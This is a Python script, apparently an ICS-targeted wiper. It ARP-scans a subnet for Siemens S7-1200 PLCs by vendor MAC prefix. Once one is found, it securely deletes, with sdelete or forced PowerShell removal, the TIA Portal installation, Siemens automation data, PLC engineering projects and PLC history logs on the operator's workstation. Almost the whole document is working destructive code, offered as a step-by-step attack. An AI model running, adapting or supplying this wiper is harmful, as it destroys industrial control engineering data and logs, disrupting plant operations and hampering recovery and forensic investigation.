import os
import subprocess
import scapy.all as scapy

# -----------------------------------
# Step 1: Identify Siemens S7-1200 PLC's IP
# -----------------------------------

def scan_network(ip_range):
    """
    Perform an ARP scan to identify devices on the local network.
    Returns a list of IPs where Siemens S7-1200 is detected.
    """
    print("[+] Scanning network for Siemens S7-1200 PLC...")

    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    plc_ip = None
    for element in answered_list:
        mac_address = element[1].hwsrc
        ip_address = element[1].psrc
        
        # Siemens PLC MAC address typically starts with known OUI prefixes (e.g., 00:0E:8C)
        if mac_address.startswith(("00:0E:8C", "28:63:36", "3C:F7:A4")):
            plc_ip = ip_address
            print(f"[+] Found Siemens S7-1200 PLC: {plc_ip} ({mac_address})")
            break  # Stop after finding the first PLC

    if plc_ip is None:
        print("[-] Siemens S7-1200 PLC not found.")
        exit(1)

    return plc_ip

# -----------------------------------
# Step 2: Data Destruction on the Operator's Windows Machine
# -----------------------------------

def destroy_files():
    """
    Deletes critical engineering workstation files and Siemens PLC project files.
    Uses sdelete.exe if available, otherwise falls back to PowerShell delete command.
    """
    print("[+] Executing data destruction...")

    # Critical Siemens/TIA Portal software directories (example paths)
    critical_paths = [
        "C:\\Program Files\\Siemens\\TIA Portal\\",
        "C:\\ProgramData\\Siemens\\Automation\\",
        "C:\\Users\\Public\\Documents\\Siemens\\",
        "C:\\Engineering_Projects\\PLC\\",  # Example engineering project folder
        "C:\\Logs\\PLC_History\\",  # Example log folder 
    ]

    sdelete_path = "C:\\Windows\\System32\\sdelete.exe"  # Adjust path if necessary

    for path in critical_paths:
        if os.path.exists(path):
            print(f"[+] Deleting: {path}")

            if os.path.exists(sdelete_path):
                # Use SDelete for secure deletion
                subprocess.run([sdelete_path, "-r", "-s", path], shell=True)
                print(f"[+] Securely deleted {path} using sdelete.exe")
            else:
                # Use PowerShell fallback
                subprocess.run(["powershell.exe", "-Command", f"Remove-Item -Path '{path}' -Recurse -Force"], shell=True)
                print(f"[+] Deleted {path} using PowerShell Remove-Item")
    
    print("[+] Data Destruction Completed.")

# -----------------------------------
# Step 3: Execute Everything
# -----------------------------------

if __name__ == "__main__":
    # Define subnet to scan for PLCs (change based on network setup)
    subnet_range = "192.168.1.1/24"
    
    plc_ip_address = scan_network(subnet_range)
    
    print(f"[+] Proceeding with data destruction after finding PLC at {plc_ip_address}...")
    
    destroy_files()